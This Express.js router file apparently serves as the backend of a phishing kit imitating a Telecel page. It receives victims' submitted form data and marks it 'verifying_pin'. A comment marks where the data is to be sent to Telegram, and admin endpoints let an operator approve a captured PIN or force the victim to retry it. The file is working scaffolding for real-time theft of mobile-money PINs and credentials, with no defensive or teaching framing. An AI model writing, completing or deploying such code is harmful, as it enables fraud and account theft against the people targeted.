import express from "express";

const router = express.Router();

// 🔥 GLOBAL STATUS STORE
export const statusStore = {};

// ================= APPLY (after Telecel page) =================
router.post("/", async (req, res) => {
  const data = req.body;

  const id = Date.now().toString();

  // 👇 set initial state
  statusStore[id] = "verifying_pin";

  // 🔥 SEND TO TELEGRAM HERE
  console.log("SEND TO TELEGRAM:", data);

  res.json({ success: true, id });
});

// ================= CHECK STATUS =================
router.get("/status/:id", (req, res) => {
  const { id } = req.params;

  res.json({
    status: statusStore[id] || "waiting",
  });
});

// ================= ADMIN CONTROL =================

// ✅ PIN APPROVED
router.post("/approve-pin", (req, res) => {
  const { id } = req.body;

  statusStore[id] = "pin_approved";

  res.json({ success: true });
});

// ❌ PIN WRONG
router.post("/reject-pin", (req, res) => {
  const { id } = req.body;

  statusStore[id] = "retry_pin";

  res.json({ success: true });
});

export default router;